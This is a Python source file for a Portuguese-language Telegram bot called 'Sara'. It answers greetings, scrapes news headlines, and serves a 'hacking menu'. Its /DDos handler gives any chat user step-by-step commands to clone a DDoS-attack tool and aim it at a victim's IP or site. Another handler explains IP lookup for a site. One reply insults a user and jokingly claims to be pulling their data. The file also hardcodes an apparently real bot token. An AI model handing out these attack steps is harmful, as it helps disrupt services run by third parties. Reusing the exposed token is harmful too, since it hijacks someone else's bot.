from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters
import requests
from bs4 import BeautifulSoup
import pandas as pd
import pyfiglet



sara_logo = pyfiglet.figlet_format("S a r a")
print(sara_logo)
def termux_config(update: Update, _: CallbackContext) -> None:
    update.message.reply_text("$ CONFIGURAÇÕES TERMUX $ \n clear -> limpa o Terminal \n Chuva Matrix -> pkg install cmatrix / cmatrix \n figlets -> pkg install figlet \n Configurações da Internet -> apt install net-toools / ifconfig \n Figlet Colorido -> pkg install toilet / toilet -f mono12 -F gay Texto \n $ QUALQUER ERRO INFORMAR AO CIRADOR -> t.me/Jão_Dev $")
def hacking_comands_android(update: Update, _: CallbackContext) -> None:
    msg = update.message.text
    update.message.reply_text("$ Menu Hacking $ \n /termux -> exibe link de Dowlond do Aplicativo \n /DDos -> Exibe Comandos Para Aplicar um DDos/Dos \n /find_ip -> Exibe Comandos Para Procurar Ip de Um Determinado Site \n /termux_config -> Exibe configurações do Termux")
def find_ip(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("$ COMANDOS PARA ENCONTRAR IP DE SITE $ \n -> pkg install git \n -> pkg install python \n -> git clone https://github.com/maldevel/IPGeolcation \n -> ls \n -> cd IPGeoLocation \n -> ls \n -> chmode +x ipgeolocation.py \n -> ls \n -> pip install -r requirements.txt \n -> python ipgeolocation.py -m \n -> python ipgeolocation.py -t www.seusite.com \n $ QUALQUER ERRO INFORMAR AO CRIADOR -> t.me/Jão_Dev $")
def DDos(update: Update, context: CallbackContext) -> None:
        update.message.reply_text("$ COMANDOS PARA APLICAR UM ATAQUE DDOS $ \n -> pkg install python2 \n -> pkg update && apt upgrade -y \n -> pkg install git \n -> git clone https://github.com/Ha3MrX/DDos-Attack \n -> ls \n -> cd DDos-Attack \n -> ls \n -> python2 ddos-attack.py \n -> IP DA VITIMA/SITE \n -> PORTA 80")
def echo(update: Update, _: CallbackContext) -> None:
    msg = update.message.text
    if msg == "Bom dia":
        update.message.reply_text(update.message.text)
    if msg == "Boa tarde":
        update.message.reply_text(update.message.text)
    if msg == "Boa noite":
        update.message.reply_text(update.message.text)
    if msg == "tchau":
        update.message.reply_text(f'Tchau {update.effective_user.first_name} até logo!')
    if msg == "Tchau":
        update.message.reply_text(f'Tchau {update.effective_user.first_name} até logo!')
    if msg == "Sara":
        update.message.reply_text(f'Opa {update.effective_user.first_name}!, Precisa de mim?')
    if msg == "sara":
        update.message.reply_text(f'Opa {update.effective_user.first_name}!, precisa de mim?')
    if msg == "A sara vai ser minha":
        update.message.reply_text(f'{update.effective_user.first_name} não seu merda eu não serei sua')
        update.message.reply_text(f'Puxando Dados do {update.effective_user.first_name}')

def menu(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(">> LISTA DE COMANDOS  << \n /hello -> Exibe uma Mensagem para o usuario \n /news -> Mostra a Noticias mais Recentes \n /hacking_comands_android -> Mostra Comandos de Hacking Para Android")
def hello(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(f'Hello {update.effective_user.first_name}, digite /menu para ver a lista de comandos disponiveis!')
def news(update: Update, context: CallbackContext) -> None:
    lista_noticias = []
    response = requests.get('https://g1.globo.com/')
    content = response.content
    site = BeautifulSoup(content, 'html.parser')
    # HTML da notícia
    noticias = site.findAll('div', attrs={'class': 'feed-post-body'})
    for noticia in noticias:
      # Título
      titulo = noticia.find('a', attrs={'class': 'feed-post-link'})
      # print(titulo.text)
      # print(titulo['href']) # link da notícia
      # Subtítulo: div class="feed-post-body-resumo"
      subtitulo = noticia.find('div', attrs={'class': 'feed-post-body-resumo'})
      if (subtitulo):
        # print(subtitulo.text)
        lista_noticias.append([titulo.text, subtitulo.text, titulo['href']])
      else:
        lista_noticias.append([titulo.text, '', titulo['href']])
    news = pd.DataFrame(lista_noticias, columns=['Título', 'Subtítulo', 'Link'])
    news.to_excel('noticias.xlsx', index=False)
    print(news)
    update.message.reply_text('Essas são as ultimas Noticias: \n {}'.format(news))


updater = Updater('1333956562:AAEfZGidPtycgOSizSwiu36QC9zNUb5fdJU')
updater.dispatcher.add_handler(CommandHandler('hello', hello))
updater.dispatcher.add_handler(CommandHandler('news', news))
updater.dispatcher.add_handler(CommandHandler('menu',menu))
updater.dispatcher.add_handler(CommandHandler('DDos',DDos))
updater.dispatcher.add_handler(CommandHandler('find_ip',find_ip))
updater.dispatcher.add_handler(CommandHandler('termux_config',termux_config))
updater.dispatcher.add_handler(CommandHandler('hacking_comands_android',hacking_comands_android))
updater.dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
updater.dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, hacking_comands_android))
updater.start_polling()
updater.idle()
